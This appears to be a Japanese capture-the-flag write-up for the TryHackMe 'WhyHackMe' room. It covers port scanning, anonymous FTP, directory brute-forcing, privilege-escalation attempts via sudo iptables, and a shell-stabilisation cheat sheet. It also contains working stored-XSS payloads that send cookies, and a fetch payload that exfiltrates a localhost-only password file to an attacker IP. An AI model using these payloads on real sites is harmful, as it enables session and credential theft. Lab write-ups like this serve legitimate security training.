# WhyHackMe CTF

https://tryhackme.com/room/whyhackme

## Enumeration

```shell
TARGET=10.10.32.98
sudo bash -c "echo $TARGET   whyhackme.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-150-43:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-09 07:57 BST
Nmap scan report for whyhackme.thm (10.10.32.98)
Host is up (0.034s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
41312/tcp filtered unknown
MAC Address: 02:8A:69:0D:DB:57 (Unknown)
```

### FTP

```sh
$ ftp $TARGET
Connected to 10.10.32.98.
220 (vsFTPd 3.0.3)
Name (10.10.32.98:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||28992|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
```

```sh
$ cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
- admin
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://whyhackme.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://whyhackme.thm/assets/]
/blog.php             (Status: 200) [Size: 3102]
/cgi-bin/             (Status: 403) [Size: 278]
/config.php           (Status: 200) [Size: 0]
/dir                  (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 563]
/login.php            (Status: 200) [Size: 523]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 643]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/register.php からユーザー登録し、ログインできた。

コメントの本文に XSS を試したが、タグがそのまま表示されるだけで失敗した。

```
good<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

コメント投稿時、自分の名前が表示されているので、名前自体を

```
good<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

にして登録し、コメント投稿する。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.32.98 - - [09/Jun/2025 16:55:02] "GET / HTTP/1.1" 200 -
10.10.32.98 - - [09/Jun/2025 16:56:02] "GET / HTTP/1.1" 200 -
```

リクエストが来たが、Cookie は取れなかった。

SSRF で/dev/pass.txt をリクエストさせ、それを送信させる。

```js
<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.13.85.243:8000/"+encodeURIComponent(t), {mode:"no-cors"}))</script>
```

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.206.200 - - [09/Jun/2025 19:02:03] "GET /[REDACTED] HTTP/1.1" 404 -
```

URL デコードすると、jack の認証情報になる。

## 権限昇格

```sh
jack@ubuntu:~$ sudo -l
[sudo] password for jack:
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

iptables-save とセットであれば、任意のファイルを上書きしたりできるようだが、そうではないので悪用方法が分からない。

```sh
jack@ubuntu:~$ cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "root";
$password = "MysqlPasswordIsPrettyStrong";
$dbname = "commentDB";
?>
```

MySQL に接続したが、分かったのは admin ユーザーのハッシュ値のみ。

```sh
jack@ubuntu:~$ ls -al /opt
total 40
drwxr-xr-x  2 root root  4096 Aug 16  2023 .
drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
```

urgent.txt

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

```sh
jack@ubuntu:/opt$ ls -al /usr/lib
total 1144
drwxr-xr-x 91 root root     4096 Jan 29  2024 .
drwxr-xr-x 14 root root     4096 Aug 31  2022 ..
...
drwxr-x---  2 root h4ck3d   4096 Aug 16  2023 cgi-bin
```

```sh
jack@ubuntu:/opt$ sudo iptables -S
[sudo] password for jack:
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -p tcp -m tcp --dport 41312 -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -j DROP
-A OUTPUT -o eth0 -j ACCEPT
```

```sh
jack@ubuntu:/opt$ netstat -nlvp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:41312           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```

41312 ポートがバックドアになっていて、現状は iptables の設定でブロックされているとのこと。

ルールを削除。

```sh
jack@ubuntu:/opt$ sudo iptables -D INPUT -p tcp --dport 41312 -j DROP
```

nc で接続はできるが、反応が無い状態。pcap を解析する必要がありそう。

```sh
$ nc 10.10.206.200 41312
```

続きはまた後日

## 振り返り

- SSRF で、`http://127.0.0.1/dir/pass.txt` は成功するが、`http://localhost/dir/pass.txt` では機能しなかった。それに気付かず時間がかかった。
-

## シェル安定化メモ

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236

```
